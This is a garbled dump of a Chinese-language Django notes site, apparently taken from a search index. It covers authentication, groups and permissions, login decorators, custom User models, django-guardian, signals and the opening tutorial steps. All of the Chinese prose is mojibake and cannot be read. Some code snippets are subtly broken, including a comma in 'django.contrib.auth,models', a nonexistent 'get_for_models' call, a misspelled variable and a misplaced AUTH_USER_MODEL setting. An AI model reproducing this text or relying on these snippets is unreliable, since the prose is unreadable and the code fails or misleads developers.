Group.objects.create(name=\u0026#34;Rookie\u0026#34;) # åˆ›å»ºä¸€ä¸ªåä¸º â€˜Rookieâ€™ çš„ Group å¯¹è±¡ï¼Œè¿”å›è¯¥å¯¹è±¡  Rookie_User.groups.add(Rookie_Group) # å°† Rookie_User è¿™ä¸ªç”¨æˆ·åŠ å…¥ Rookie_Group è¿™ä¸ªç”¨æˆ·ç»„  Rookie_Group.user_set.all() # è·å–è¯¥ç”¨æˆ·ç»„å†…çš„å…¨éƒ¨ç”¨æˆ·æ„æˆçš„ä¸€ä¸ªåˆ—è¡¨ Group æ¨¡å—ä¸­æœ‰æˆå‘˜ï¼šPermissions æ¨¡å—çš„ä¸€ä¸ªå¯¹è±¡ï¼Œç”¨äºç®¡ç†ç”¨æˆ·çš„æƒé™ï¼Œå…¶ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\ngroup.permissions.set([permission_list]) # ç”¨äºè®¾ç½®ç”¨æˆ·ç»„çš„æƒé™ group.permissions.add(permission1, permission2, ...) # ç»™ç”¨æˆ·ç»„æ·»åŠ æƒé™ group.permissions.remove(permission1, permission2, ...) # ç§»é™¤ç”¨æˆ·ç»„ä¸­çš„æŸäº›æƒé™ group.permissions.clear() # æ¸…ç©ºè¯¥ç”¨æˆ·ç»„çš„æ‰€æœ‰æƒé™ Permission ä¹Ÿå¯ä»¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼è¿›è¡Œè‡ªå®šä¹‰ï¼Œä¸‹é¢ç»™å‡ºä¸€ä¸ªç”¨æ³•å®ä¾‹ï¼š\nfrom myapp.models import BlogPost from django.contrib.auth,models import Permission from django.contrib.contenttypes.models import ContentType  content_type = ContentType.objects.get_for_models(BlogPost) permisstion = Permission.objects.create(  codename=\u0026#39;can_publish\u0026#39;,  name=\u0026#39;Can Publish Posts\u0026#39;,  content_type=content_type, ) ä½ å¯ä»¥é€šè¿‡ User æ¨¡å‹çš„ user_permissions å±æ€§æˆ–è€… Group æ¨¡å‹çš„ permissions å±æ€§ä¸ºç”¨æˆ·æ·»åŠ è¯¥æƒé™ã€‚\næƒé™æ£€æŸ¥åï¼Œä¼šè¢«ç¼“å­˜åœ¨ç”¨æˆ·å¯¹è±¡ä¸­ï¼Œåªæœ‰å½“å¯¹è±¡å†æ¬¡è¢«åŠ è½½ï¼Œæƒé™æ‰ä¼šæ›´æ–°ã€‚\nAuthentication in Web requests #  Django åœ¨è¯·æ±‚å¯¹è±¡ä¸­ä½¿ç”¨ sessions å’Œä¸­é—´å…³è”è¯·æ±‚è¿›è¡Œç”¨æˆ·ç™»å½•è®¤è¯ã€‚\næ¯ä¸€æ¬¡è¯·æ±‚ä¸­éƒ½åŒ…å«ä¸€ä¸ª request.user å±æ€§ï¼Œè¡¨ç¤ºå½“å‰ç”¨æˆ·ã€‚å¦‚æœè¯¥ç”¨æˆ·æœªç™»é™†ï¼Œè¯¥å±æ€§çš„å€¼æ˜¯ä¸€ä¸ª AnonymousUser å®ä¾‹ï¼ˆåŒ¿åç”¨æˆ·ï¼‰ï¼Œå¦‚æœå·²ç»ç™»å½•ï¼Œè¯¥å±æ€§å°±æ˜¯ä¸€ä¸ªUseræ¨¡å‹çš„å®ä¾‹ã€‚\nå¯ä»¥ä½¿ç”¨ is_authenticated è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥æ˜¯åŒ¿åç”¨æˆ·ï¼Œåˆ™è¿”å› Falseã€‚\nHow to log a user in? #  ä½¿ç”¨è®¤è¯ç³»ç»Ÿæä¾›çš„ login() æ–¹æ³•ç™»å½•ç”¨æˆ·ã€‚å®ƒæ¥æ”¶ä¸€ä¸ª HttpRequest å‚æ•°å’Œä¸€ä¸ª User å¯¹è±¡å‚æ•°ã€‚è¯¥æ–¹æ³•ä¼šæŠŠç”¨æˆ·çš„ ID ä¿å­˜åœ¨ Django çš„ session ä¸­ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªè®¤è¯å’Œç™»é™†çš„ä¾‹å­ï¼š\nfrom django.contrib.auth import authenticate, login  def my_view(request):  username = request.POST[\u0026#39;username\u0026#39;]  password = request.POST[\u0026#39;password\u0026#39;]  user = authenticate(username=username, password=password)  if user is not None:  login(request, user)  # è·³è½¬åˆ°æˆåŠŸé¡µé¢  ...  else:  # è¿”å›ä¸€ä¸ªéæ³•ç™»å½•çš„é”™è¯¯é¡µé¢  ... How to log a user outï¼Ÿ #  åŒæ ·å¯ä»¥ä½¿ç”¨ Django ç³»ç»Ÿæä¾›çš„å‡½æ•°ï¼š\nfrom django.contrib.auth import logout  def logout_view(request):  logout(request)  # è·³è½¬åˆ°æˆåŠŸçš„é¡µé¢ æ³¨æ„ï¼Œè¢«logoutçš„ç”¨æˆ·å¦‚ä½•æ²¡ç™»å½•ï¼Œä¸ä¼šæŠ›å‡ºé”™è¯¯ã€‚ ä¸€æ—¦logoutï¼Œå½“å‰è¯·æ±‚ä¸­çš„sessionæ•°æ®éƒ½ä¼šè¢«æ¸…ç©ºã€‚\nLimiting access to logged-in users #  ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š\n  åŸå§‹æ–¹æ³•ï¼Œå°†ç”¨æˆ·é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼š\nfrom django.conf import settings from django.shortcuts import redirect  def my_view(request): if not request.user.is_authenticated: \treturn redirect(\u0026#39;%s?next=%s\u0026#39; % (settings.LOGIN_URL, request.path)) # ...   ä½¿ç”¨è£…é¥°å™¨ï¼Œè¢«è£…é¥°çš„ views åªæœ‰ç”¨æˆ·ç™»å½•åæ‰å¯ä»¥è®¿é—®ã€‚åŸå‹ä¸ºï¼š\nlogin_required(redirect_field_name=\u0026#39;next\u0026#39;, login_url=None)[source] ä½¿ç”¨æ–¹æ³•å¤§è‡´å¦‚ä¸‹ï¼š\nfrom django.contrib.auth.decorators import login_required  @login_required def my_view(request):  ... login_required è£…é¥°å™¨ä¼šåˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦å·²ç»ç™»å½•ï¼šå¦‚æœå·²ç»ç™»å½•ï¼Œæ‰§è¡Œæ­£å¸¸çš„è§†å›¾ï¼›å¦‚æœæ²¡æœ‰ç™»å½•ï¼Œåˆ™ä¼šé‡å®šå‘åˆ° settings.LOGIN_URL æŒ‡å‘çš„ urlpaternï¼Œå¹¶å°†å½“å‰è®¿é—®çš„ç»å¯¹è·¯å¾„ä½œä¸º url çš„ next å‚æ•°ã€‚\nå¦‚æœä½ æƒ³ä½¿ç”¨è‡ªå®šä¹‰çš„å‚æ•°ï¼Œå¯ä»¥ä¿®æ”¹ login_required() çš„ redirect_field_name å‚æ•°ï¼›å¦‚æœä½ æƒ³ä¿®æ”¹é‡å®šå‘åˆ°çš„ç™»å½• URLï¼Œå¯ä»¥ä¿®æ”¹ login_url å‚æ•°ã€‚\n  ä½¿ç”¨ LoginRquired Mixinã€‚é€šè¿‡ç»§æ‰¿ LoginRequiredMixin ç±»çš„æ–¹å¼é™åˆ¶ç”¨æˆ·ã€‚åœ¨å¤šé‡ç»§æ‰¿æ—¶ï¼Œè¯¥ç±»å¿…é¡»æ˜¯ç»§æ‰¿å…³ç³»æœ€å·¦è¾¹çš„çˆ¶ç±»ã€‚ä¸€ä¸ªå®ä¾‹å¦‚ä¸‹ï¼š\nfrom django.contrib.auth.mixins import LoginRequiredMixin  class MyView(LoginRequiredMixin, View):  login_url = \u0026#39;/login/\u0026#39;  redirect_field_name = \u0026#39;redirect_to\u0026#39;   è¿›è¡Œæµ‹è¯•ï¼Œæ ¹æ®æµ‹è¯•ç»“æœç¡®å®šåŠ¨ä½œã€‚æ¯”å¦‚æ ¹æ®é‚®ç®±åœ°å€åˆ¤æ–­ç”¨æˆ·æƒé™ï¼š\nfrom django.shortcuts import redirect  def my_view(request):  if not request.user.email.endswith(\u0026#39;@example.com\u0026#39;):  return redirect(\u0026#39;/login/?next=%s\u0026#39; % request.path)  # ...   ä½¿ç”¨æƒé™éœ€æ±‚ä¿®é¥°å™¨ï¼ŒDjango å†…ç½®çš„è£…é¥°å™¨ permission_required ä¼šæ ¹æ®ç”¨æˆ·æƒé™ï¼Œå†³å®šè§†å›¾çš„è®¿é—®æƒé™ã€‚æƒé™çš„æ ¼å¼ä¸ºï¼š\u0026lt;app label\u0026gt;.\u0026lt;permission codename\u0026gt;ï¼ŒåŒ login_requiredï¼Œè¯¥è£…é¥°å™¨è¿˜æœ‰ä¸€ä¸ªå¯é€‰çš„ login_url å‚æ•°ï¼Œæ— æƒé™ç”¨æˆ·ä¼šè·³è½¬åˆ°è¯¥ urlã€‚ä¸€ä¸ªä½¿ç”¨çš„ä¾‹å­å¦‚ä¸‹ï¼š\nfrom django.contrib.auth.decorators import permission_required  @permission_required(\u0026#39;polls.can_vote\u0026#39;, login_url=\u0026#39;/loginpage/\u0026#39;) def my_view(request):  ...   Extending the existing User model #  Django ç”¨æˆ·è®¤è¯ç³»ç»Ÿæä¾›çš„å†…ç½®çš„ User å¯¹è±¡ä»…åŒ…å«ä»¥ä¸‹ä¸€äº›ä¸»è¦çš„å±æ€§ï¼š\n username, password, email, first_name, last_name  å¯¹äºä¸€äº›ç½‘ç«™æ¥è¯´ï¼Œç”¨æˆ·å¯èƒ½è¿˜åŒ…å«æœ‰æ˜µç§°ã€å¤´åƒã€ä¸ªæ€§ç­¾åç­‰ç­‰å…¶å®ƒå±æ€§ï¼Œå› æ­¤ä»…ä»…ä½¿ç”¨ Django å†…ç½®çš„ User æ¨¡å‹æ˜¯ä¸å¤Ÿã€‚å¥½åœ¨ Django ç”¨æˆ·ç³»ç»Ÿéµå¾ªå¯æ‹“å±•çš„è®¾è®¡åŸåˆ™ï¼Œæˆ‘ä»¬å¯ä»¥æ–¹ä¾¿åœ°æ‹“å±• User æ¨¡å‹ã€‚\næˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹æ³•æ‰©å±•æˆ‘ä»¬çš„ User æ¨¡å‹ã€‚\nuse a OneToOneField #  è¿™é€‚ç”¨äºåªå¸Œæœ›å­˜å‚¨ä¸ User ç›¸å…³è”çš„ç”¨æˆ·æ¨¡å‹ï¼Œé€šå¸¸å‘½åä¸ºProfileï¼Œmodels å®šä¹‰å¦‚ä¸‹ï¼š\nfrom django.contrib.auth.models import User  class Employee(models.Model):  user = models.OneToOneField(User, on_delete=models.CASCADE)  department = models.CharField(max_length=100) å¯ä»¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼è·å–ç›¸å…³çš„ä¿¡æ¯ï¼š\n\u0026gt;\u0026gt;\u0026gt; u = User.objects.get(username=\u0026#34;a_username\u0026#34;) \u0026gt;\u0026gt;\u0026gt; a_department= u.employee.department ä¸ºäº†åœ¨ Admin çš„ç•Œé¢ç®¡ç†æˆ‘ä»¬çš„æ¨¡å‹ï¼Œéœ€è¦åœ¨ admin.py æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹æ¨¡æ¿ï¼š\nfrom django.contrib import admin from django.contrib.auth.admin import UserAdmin as BaseUserAdmin from django.contrib.auth.models import User  from my_user_profile_app.models import Employee  # ä¸º Employee å®šä¹‰ä¸€ä¸ªå†…è”çš„ç®¡ç†å‘˜æè¿° # Employee å’Œ User è¡¨å°±ä¼šçœ‹èµ·æ¥åƒä¸€å¼ è¡¨ä¸€æ · class EmployeeInline(admin.StackedInline):  model = Employee  can_delete = False  verbose_name_plural = \u0026#39;employee\u0026#39;  class UserAdmin(BaseUserAdmin):  inlines = (EmployeeInline,)  admin.site.unregister(User) admin.site.register(User, UserAdmin) ä¸ºäº†å°†æˆ‘ä»¬å®šä¹‰çš„æ–° User æäº¤åˆ° Djangoï¼Œä»¤å…¶å¯ä»¥è¯†åˆ«ï¼Œéœ€è¦åœ¨ settings ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š\nAUTH_USER_MODEL = \u0026#39;myapp.MyUser\u0026#39; å¹¶ä¸”å°† User æ‰€åœ¨çš„åº”ç”¨æ·»åŠ åˆ° INSTALLED_APPS ä¸­ã€‚\nUsing a custom user model #  Django å¼ºçƒˆæ¨èæˆ‘ä»¬ä½¿ç”¨ AbstractUser æ¥æ´¾ç”Ÿæˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ User å¯¹è±¡ã€‚äº‹å®ä¸Šï¼Œç³»ç»Ÿå®šä¹‰çš„ User å¯¹è±¡å®é™…ä¸Šä¹Ÿæ˜¯ç»§æ‰¿è‡ª AbstracUser çš„æŠ½è±¡åŸºç±»ï¼Œä»…ä»…æ˜¯ç»§æ‰¿ï¼Œæ²¡æœ‰åšä»»ä½•æ‹“å±•ï¼Œæºç å¦‚ä¸‹ï¼š\nfrom django.db import models from django.contrib.auth.models import AbstractUser  class User(AbstractUser):  \u0026#34;\u0026#34;\u0026#34; Users within the Django authentication system are represented by this model. Username, password and email are required. Other fields are optional. \u0026#34;\u0026#34;\u0026#34;  class Meta(AbstractUser.Meta):  swappable = \u0026#39;AUTH_USER_MODEL\u0026#39; æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡ç»§æ‰¿ AbstractUserï¼Œå°†è·å¾— User çš„å…¨éƒ¨ç‰¹æ€§ï¼Œè€Œä¸”è¿˜å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚è¿›è¡Œæ‹“å±•ã€‚\nPostScriptï¼šä¸è¦å¿˜è®°åƒå‰ä¸€ç§æ–¹æ³•ä¸€æ ·åœ¨ setting.py ä¸­æ·»åŠ  AUTH_USER_MODEL ä¸ INSTALLED_APPS è®¾ç½®ã€‚\nä¸€ä¸ªå®ä¾‹å¦‚ä¸‹ï¼š\n  åœ¨ users/models.py ä¸­å†™ä¸‹å¦‚ä¸‹ä»£ç ï¼š\nfrom django.db import models from django.contrib.auth.models import AbstractUser  class User(AbstractUser): \tnickname = models.CharField(max_length=50, blank=True)   class Meta(AbstractUser.Meta):  pass   åœ¨ settings.py ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š\nAUTH_USER_MODEL = \u0026#39;users.User\u0026#39;  LANGUAGE_CODE = \u0026#39;zh-hans\u0026#39; TIME_ZONE = \u0026#39;Asia/Shanghai\u0026#39;   è¿è¡Œä»¥ä¸‹çš„ä¸¤è¡Œä»£ç ï¼š\n$ python manage.py makemigrations  $ python manage.py migrate   "},{"id":130,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/guardian/","title":"Guardian","section":"Django","content":" é¡¹ç›®åœ°å€ï¼šhttps://github.com/django-guardian/django-guardian\nå®˜æ–¹æ–‡æ¡£ï¼šhttps://django-guardian.readthedocs.io/en/stable/\nä¸­æ–‡ä»‹ç»ï¼šhttps://www.jianshu.com/p/404fd39d5efc\n django-guardian #  django-guardian æ˜¯ä¸€ä¸ªå¯¹è±¡æƒé™çš„æ¡†æ¶ã€‚\nå¯¹è±¡æƒé™æ˜¯ä¸€ç§å¯¹è±¡é¢—ç²’åº¦ä¸Šçš„æƒé™æœºåˆ¶ï¼Œå®ƒå…è®¸ä¸ºæ¯ä¸ªå…·ä½“å¯¹è±¡æˆæƒã€‚\nDjango å…¶å®åŒ…å«äº† object permission çš„æ¡†æ¶ï¼Œä½†æ²¡æœ‰å…·ä½“å®ç°ï¼Œobject permission çš„å®ç°éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹ appdjango-guardian**ï¼Œ**æˆ‘ä»¬åœ¨å¼€å‘ä¸­ç”¨è°ƒç”¨ django guradian å°è£…å¥½çš„æ–¹æ³•å³å¯ã€‚\nTutorial #    å®‰è£…ï¼š\n$ pip install django-guardian   é…ç½®ï¼š\nåœ¨ INSTALLED_APPS ä¸­æ·»åŠ ä¸€ä¸ªè¯¥æ¨¡å—ï¼š\nINSTALLED_APPS = (  ...  \u0026#39;guardian\u0026#39;, ) åœ¨ settings.py ä¸­æ–°æ·»åŠ ä¸€ä¸ªæ•°æ® AUTENTICATION_BACKENDSï¼š\nAUTHENTICATION_BACKENDS = (  \u0026#39;django.contrib.auth.backends.ModelBackend\u0026#39;, # default  \u0026#39;guardian.backends.ObjectPermissionBackend\u0026#39;, ) ç„¶åç”Ÿæˆ guardian çš„æ•°æ®è¡¨ï¼š\n$ python manage.py migrate   ç»™å¯¹è±¡èµ‹æƒï¼š\n\u0026gt;\u0026gt;\u0026gt; from django.contrib.auth.models import User, Group \u0026gt;\u0026gt;\u0026gt; jack = User.objects.create_user(\u0026#39;jack\u0026#39;, \u0026#39;jack@example.com\u0026#39;, \u0026#39;topsecretagentjack\u0026#39;) \u0026gt;\u0026gt;\u0026gt; admins = Group.objects.create(name=\u0026#39;admins\u0026#39;) \u0026gt;\u0026gt;\u0026gt; jack.has_perm(\u0026#39;change_group\u0026#39;, admins) False \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; # å…³é”® \u0026gt;\u0026gt;\u0026gt; from guardian.models import UserObjectPermission \u0026gt;\u0026gt;\u0026gt; UserObjectPermission.objects.assign_perm(\u0026#39;change_group\u0026#39;, jack, obj=admins) \u0026lt;UserObjectPermission: admins | jack | change_group\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; jack.has_perm(\u0026#39;change_group\u0026#39;, admins) True   admin-site ç•Œé¢ä¸­ï¼š\nfrom django.contrib import admin from myapp.models import Author from guardian.admin import GuardedModelAdmin  # Old way: #class AuthorAdmin(admin.ModelAdmin): # pass  # With object permissions support class AuthorAdmin(GuardedModelAdmin):  pass  admin.site.register(Author, AuthorAdmin)   "},{"id":131,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/signals/","title":"Signals","section":"Django","content":"Django Signals #  Built-in Signals #  Django provides a set of built-in signals that let user code get notified by Django itself of certain actions. These include some useful notifications:\n  django.db.models.signals.pre_save \u0026amp; django.db.models.signals.post_save\nSent before or after a modelâ€™s save() method is called.\n  django.db.models.signals.pre_delete \u0026amp; django.db.models.signals.post_delete\nSent before or after a modelâ€™s delete() method or querysetâ€™s delete() method is called.\n  django.db.models.signals.m2m_changed\nSent when a ManyToManyField on a model is changed.\n  django.core.signals.request_started \u0026amp; django.core.signals.request_finished\nSent when Django starts or finishes an HTTP request.\n  See the built-in signal documentation for a complete list, and a complete explanation of each signal.\nListen to Signals #  To receive a signal, register a receiver function using the Signal.connect() method. The receiver function is called when the signal is sent:\n# å‡½æ•°åŸå‹ Signal.connect(receiver, sender=None, weak=True, dispatch_uid=None) \u0026#34;\u0026#34;\u0026#34; å‚æ•°è¯´æ˜ï¼š - receiver: ä¿¡å·å‘ç”Ÿçš„å›è°ƒå‡½æ•° See [Receiver functions](https://docs.djangoproject.com/en/2.1/topics/signals/#receiver-functions) - sender: æŒ‡å®šä¸€ä¸ªä¿¡å·çš„å‘ç”Ÿè€… See [Connecting to signals sent by specific senders](https://docs.djangoproject.com/en/2.1/topics/signals/#connecting-to-specific-signals) - weak: æš‚æ—¶æ²¡çœ‹æ‡‚ï¼Œåæ­£é»˜è®¤æ˜¯ True å°±å¯¹äº† - dispatch_uid: åœ¨å¯èƒ½å‘ç”Ÿé‡å¤ä¿¡å·çš„æƒ…å†µä¸‹è®¾ç½®æ¥å—å™¨çš„å”¯ä¸€æ ‡è¯† \u0026#34;\u0026#34;\u0026#34; "},{"id":132,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial01/","title":"Tutorial01","section":"Tutorial","content":" å­¦ä¹ ç½‘å€ï¼šhttps://www.djangoproject.com/start/\n Tutorial01 #  ä½¿ç”¨ Djangoï¼Œè¯·é…ç½® Python3.5 åŠä»¥ä¸Šç¯å¢ƒï¼ŒæŸ¥çœ‹ Python ç‰ˆæœ¬è¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š\n$ python --version æœ¬ tutorial å»ºç«‹åœ¨å·²ç»å®‰è£… Django ç¯å¢ƒçš„åŸºç¡€ä¸Šï¼ŒDjango æ˜¯ Python çš„ä¸€ä¸ªæ¨¡å—ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å®‰è£…ï¼š\n$ pip install django å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ£€æµ‹ Django æ˜¯å¦å·²ç»å®‰è£…ï¼š\n$ python -m django --version # å·²ç»å®‰è£…è¿”å›ç‰ˆæœ¬å·ï¼Œæœªå®‰è£…è¿”å› No module named django. Createing a project #  ç¬¬ä¸€æ¬¡ä½¿ç”¨ Djangoï¼Œå…ˆè¿›è¡Œåˆå§‹åŒ–ï¼Œä½¿ç”¨ cd ï¼ˆchange directoryï¼‰å‘½ä»¤åˆ°å·¥ä½œåˆ°ç›®æ ‡æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„ Django é¡¹ç›®ï¼š\n$ django-admin startproject mysite PostScript: é¡¹ç›®çš„åç§°ä¸åº”è¯¥ä¸è¢« Python æˆ– Django å ç”¨çš„å…³é”®è¯é‡åˆï¼Œæ¯”å¦‚ï¼šdjango æˆ– test ã€‚\nä¸Šè¿°å‘½ä»¤ä¼šè‡ªåŠ¨ç”Ÿæˆä»¥ä¸‹æ–‡ä»¶ï¼Œæ–‡ä»¶åŠŸèƒ½è§£é‡Šï¼š\n  manage.pyï¼šDjango æä¾›çš„ä¸é¡¹ç›®è¿›è¡Œäº¤äº’çš„ä¸€ä¸ª Python è„šæœ¬æ–‡ä»¶ï¼Œè¯¦ç»†ä¿¡æ¯ã€‚\n  mysite/ï¼šPython é¡¹ç›®çš„å®é™…æ¨¡å—åŒ…ï¼Œè¯¥æ–‡ä»¶å¤¹çš„åå­—ä¸é¡¹ç›®åç§°ç›¸åŒã€‚\n  mysite/__init__.pyï¼šä¸€ä¸ªç©ºæ–‡ä»¶ã€‚æ ¹æ® Python çš„æ ‡å‡†è§„å®šï¼Œå®šä¹‰ä¸€ä¸ªæ¨¡å—éœ€è¦ä¸€ä¸ª __init__.py æ–‡ä»¶ï¼Œè¯¥ç©ºæ–‡ä»¶è¡¨ç¤º mysite æ˜¯ä¸€ä¸ª Python æ¨¡å—ã€‚\n  mysite/settings.pyï¼šDjango é¡¹ç›®é…ç½®æ–‡ä»¶ã€‚è¯¦ç»†ä¿¡æ¯ã€‚\n  mysite/urls.pyï¼šDjango é¡¹ç›®çš„ URL å£°æ˜ã€‚è¯¦ç»†ä¿¡æ¯ã€‚\n  mysite/wsgi.pyï¼šå…¼å®¹ wsgi çš„ web æœåŠ¡å…¥å£ã€‚éƒ¨ç½²ä¿¡æ¯ã€‚\n  The development server #  å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡ŒæœåŠ¡ï¼š\n$ python manage.py runserver é»˜è®¤è¿è¡Œç«¯å£æ˜¯ 8000ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šç«¯å£è¿è¡ŒæœåŠ¡ï¼š\n$ python manage.py runserver 8000 å®Œæ•´çš„å‚è€ƒä¿¡æ¯ã€‚\nCreating the Polls app #  app ä¸ project çš„åŒºåˆ«ï¼Ÿ\n app æ˜¯ä¸€ä¸ªé¡¹ç›®ä¸­å…·ä½“å®ŒæˆæŸé¡¹åŠŸèƒ½çš„åº”ç”¨ã€‚ä¸€ä¸ªé¡¹ç›®ç”±è®¸å¤šä¸ª app ç»„æˆã€‚  app å¯ä»¥åœ¨ä»»ä½•ä½ç½®ï¼Œæœ¬ Tutorial ä¸­ï¼Œå°†å…¶ç½®äº managy.py çš„åŒçº§ç›®å½•ä¸‹ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š\n$ python manage.py startapp polls Write your first view #  å°†ä»¥ä¸‹ä»£ç å†™å…¥ polls/views.pyï¼š\nfrom django.http import HttpResponse   def index(request):  return HttpResponse(\u0026#34;Hello, world. You\u0026#39;re at the polls index.\u0026#34;) åœ¨ polls æ–‡ä»¶å¤¹å†…åˆ›å»ºä¸€ä¸ªåä¸º urls.py çš„æ–‡ä»¶ï¼Œå°†ä»¥ä¸‹ä»£ç å†™å…¥ polls/urls.pyï¼š\nfrom django.urls import path  from . import views  urlpatterns = [  path(\u0026#39;\u0026#39;, views.index, name=\u0026#39;index\u0026#39;), ] ä¸‹ä¸€æ­¥æ˜¯åœ¨ mysite/urls.py ä¸­å¯¼å…¥æˆ‘ä»¬åˆšæ‰å†™çš„ polls/urls.pyã€‚å…ˆä» django.urls åº“ä¸­å¯¼å…¥ include æ¨¡å—ï¼Œå¹¶ä¸”åŠ å…¥ path('polls/',include('polls.urls')) åœ¨ urlpatterns ä¸­ã€‚mysite/urls.py æ–‡ä»¶å¤§è‡´å¦‚ä¸‹ï¼š\nfrom django.contrib import admin from django.urls import include, path  urlpatterns = [  path(\u0026#39;polls/\u0026#39;, include(\u0026#39;polls.urls\u0026#39;)),  path(\u0026#39;admin/\u0026#39;, admin.site.urls), ] è¾“å…¥é…ç½®æœåŠ¡å™¨ä¸­çš„æŒ‡ä»¤ï¼Œå¹¶åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ä»¥ä¸‹ urlï¼šhttps://localhost:8000/polls/ã€‚å³å¯åœ¨æµè§ˆå™¨ä¸­çœ‹åˆ° polls/views.py ä¸­å“åº”çš„ http è¯·æ±‚ã€‚\nPostScriptï¼šå»ºè®®æ€»æ˜¯ä½¿ç”¨ include æ¥å¯¼å…¥å…¶ä»–çš„ urlpatternsã€‚\nPostScriptï¼šå…³äº path() å‡½æ•°çš„å‚æ•°ï¼š\n routeï¼šä¸€ä¸ªåŒ…å« URL æ¨¡å¼å­—ç¬¦ä¸²ã€‚Django åœ¨æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚åï¼Œä¼šä¸€ä¸ªä¸ªéå† URL patterns ä¸­çš„å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°ç¬¦åˆçš„åè¿›å…¥è¯¥æ¨¡å¼å­—ç¬¦ä¸²æŒ‡å‘çš„é¡µé¢ã€‚ viewï¼šroute å‚æ•°ä¸­çš„æ¨¡å¼å­—ç¬¦ä¸²å¯¹åº”çš„ view å‡½æ•°ã€‚ ä¸¤ä¸ªå¯é€‰å‚æ•°ï¼škwargs ä¸ nameã€‚  "},{"id":133,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/tutorial02/","title":"Tutorial02","section":"Tutorial","content":"Tutorial02 #  Database setup #  æ‰“å¼€ mysite/settings.pyï¼Œè¿™æ˜¯ä¸€ä¸ª Python çš„æ¨¡å—å˜é‡ï¼Œè¡¨ç¤ºç€ Django çš„è®¾ç½®ã€‚\nDjango çš„æ•°æ®åº“é»˜è®¤ä½¿ç”¨ SQLiteï¼Œå¦‚æœæƒ³ä½¿ç”¨å…¶ä»– DBMSï¼Œéœ€è¦æ›´æ”¹ DATABASES è¿™ä¸ª Python å­—å…¸ä¸­ï¼Œ'default' é”®å€¼å¯¹åº”çš„å­—å…¸ï¼Œè¿›è¡Œä»¥ä¸‹è®¾ç½®ï¼š\n   \u0026lsquo;default\u0026rsquo; å­—å…¸é”® \u0026lsquo;default\u0026rsquo; å­—å…¸å¯èƒ½å€¼     'ENGINE' 'django.db.backends.sqlite3', 'django.db.backends.postgresql','django.db.backends.mysql', 'django.db.backends.oracle' , etc   'NAME' æ•°æ®åº“çš„åç§°ï¼Œå¦‚æœä½¿ç”¨ sqliteï¼Œåˆ™ä¸ºæ–‡ä»¶çš„è·¯å¾„   'USER' ç™»å½•æ•°æ®åº“çš„ç”¨æˆ·åï¼Œé sqlite æ•°æ®åº“å¿…é¡»æ·»åŠ    'PASSWORD' ##ç™»å½•æ•°æ®åº“ç”¨æˆ·åå¯¹åº”çš„å¯†ç ï¼Œé sqlite æ•°æ®åº“å¿…é¡»æ·»åŠ    'HOST' è¿æ¥æ•°æ®åº“çš„ä¸»æœºåï¼Œsqlite æ•°æ®åº“ä¸éœ€å£°æ˜ï¼Œç©ºå­—ç¬¦ä¸²è¡¨ç¤º 'localhost'    mysite/settings.py ä¸­ TIME_ZONE å˜é‡å¯ä»¥ç”¨äºè®¾ç½®æ—¶åŒºã€‚\nmysite/settings.py ä¸­ INSTALLED_APPS è¡¨ç¤ºé¡¹ç›®ä¸­æ‰€æœ‰åº”ç”¨çš„åå­—ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…æ‹¬äº†ä»¥ä¸‹æ¥è‡ª Django çš„ appsï¼š\n django.contrib.admin â€“ The admin site. Youâ€™ll use it shortly. django.contrib.auth â€“ An authentication system. django.contrib.contenttypes â€“ A framework for content types. django.contrib.sessions â€“ A session framework. django.contrib.messages â€“ A messaging framework. django.contrib.staticfiles â€“ A framework for managing static files.  è¿™é‡Œé¢çš„æœ‰äº›åº”ç”¨éœ€è¦æ•°æ®åº“ä¸­è‡³å°‘æœ‰ä¸€ä¸ªè¡¨æ ¼ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ›å»ºä»–ä»¬ï¼š\n$ python manage.py migrate Creating models #  Modelsï¼šæ¨¡å‹ï¼ŒæŒ‡æ˜äº†æ•°æ®åº“æ„é€ 